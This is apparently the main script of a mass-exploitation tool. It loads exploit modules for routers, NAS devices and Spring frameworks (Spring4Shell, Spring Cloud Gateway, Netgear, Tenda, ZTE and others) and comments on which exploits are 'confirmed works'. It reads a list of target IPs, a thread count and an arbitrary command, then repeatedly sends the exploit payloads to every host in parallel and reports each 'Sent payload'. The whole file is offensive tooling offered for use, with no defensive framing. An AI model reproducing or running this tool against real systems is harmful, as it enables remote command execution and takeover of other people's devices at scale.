from exploits.TerramasterTOS import *
from exploits.totolinkN600R import *
from exploits.zte_zxv10 import *
from exploits.arrissurfboard import *
from exploits.vigor_3900_2960 import *
from exploits.tenda_ac10_1200 import *
from exploits.spring_cloud_gateway import *
from exploits.ngr8500 import *
from exploits.spring4shell import *
from exploits.wavlink import *
from exploits.IpTime_C200 import *
from os.path import exists
from itertools import cycle
import os, types

import _thread

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

exmap = {
    0: terramaster,         # confirmed works
    1: totolinkN600R,       # confirmed works
    2: ZteZxv10,
    3: arris_surfboard,     # confirmed works ??
    4: vigorrouter,         # confirmed works ??
    5: tenda_ac10,          
    6: springcloudgateway,
    7: netgear_r8500,
    8: spring4,
    9: wavlink_wh,
    10: iptimeC200
}

printmap = {
    0: 'Terramaster TOS',
    1: 'Totolink N600R',
    2: 'Zte Zxv10',
    3: 'Arris SBR-(AC1900P, AC3200P, AC1200P)',
    4: 'Draytek Vigor-(3900, 2960)',
    5: 'Tenda AC10-1200',
    6: 'Spring Cloud Gateway',
    7: 'NetGear R8500',
    8: 'Spring 4 Shell',
    9: 'Wavlink WL-WN531P3',
    10: 'ipTIME ? (127 products)'
}

prompt = bcolors.OKCYAN + "[" + bcolors.HEADER + "+" + bcolors.OKCYAN + "] " + bcolors.OKBLUE

print('\n\nWelcome\n\n')
for key in printmap:
    print(prompt + str(key) + ' - ' + printmap[key])
print('\n')

def runsploit(ex, cmd, pool):
    while True:
        if type(ex) in (tuple, list):
            for x in ex:
                ip = next(pool)[:-1]
                if exmap[int(x)](ip, cmd, getsession()) == True:
                    print(prompt + "Sent payload " + bcolors.OKGREEN + "(" + ip + ") - " + bcolors.WARNING + str(printmap[int(x)]))
        else:
            ip = next(pool)[:-1]
            if exmap[ex](ip, cmd, getsession()) == True:
                print(prompt + "Sent payload " + bcolors.OKGREEN + "(" + ip + ")")

try:
    zzz = input(prompt + "Exploit > ")
    if(zzz.find(',')) != -1:
        ex = zzz.split(",")
    else: ex = int(zzz)
    ipstr = input(prompt + "Host > ")
    if exists(ipstr):
        iplist = open(ipstr, 'r').readlines()
        threads = int(input(prompt + "Threads > "))
        cmdstr = input(prompt + "Command > ")
        ip_pool = cycle(iplist)
        for x in range(threads):
            _thread.start_new_thread(runsploit, [ex, cmdstr, ip_pool, ])
        input()

    cmdstr = input(prompt + "Command > ")
    if exmap[ex](ipstr, cmdstr, getsession()) == False:
        print(prompt + "Failure")
    else:
        print(prompt + "Success")
except Exception as e:
    print(e)